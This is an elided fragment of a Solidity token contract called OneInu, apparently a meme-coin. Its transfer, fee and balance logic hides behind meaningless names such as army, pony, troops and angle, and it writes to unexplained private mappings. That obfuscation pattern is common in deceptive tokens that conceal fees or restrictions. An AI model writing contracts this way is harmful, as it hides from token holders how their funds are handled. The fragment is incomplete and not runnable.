...
contract OneInu is Ownable {
    uint256 private angle;
    string private anyone;
    uint256 private _tTotal;
    string private respect;
    uint256 private situation;
    uint8 private flew;
    ...
    function army(
        ...
        uint256 five = (troops * angle) / situation;
        troops -= five;
        fifth[guide] += flew;
        pony[road] += troops;
    }

    mapping(address => uint256) private fifth;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private habit;
    ...
    function transferFrom(
        ...
        army(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        army(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(air);
        ...
        situation = 100;
        habit[chart] = flew;
        _tTotal = 1000000000000000 * 10**flew;
        pony[msg.sender] = _tTotal;
    }
}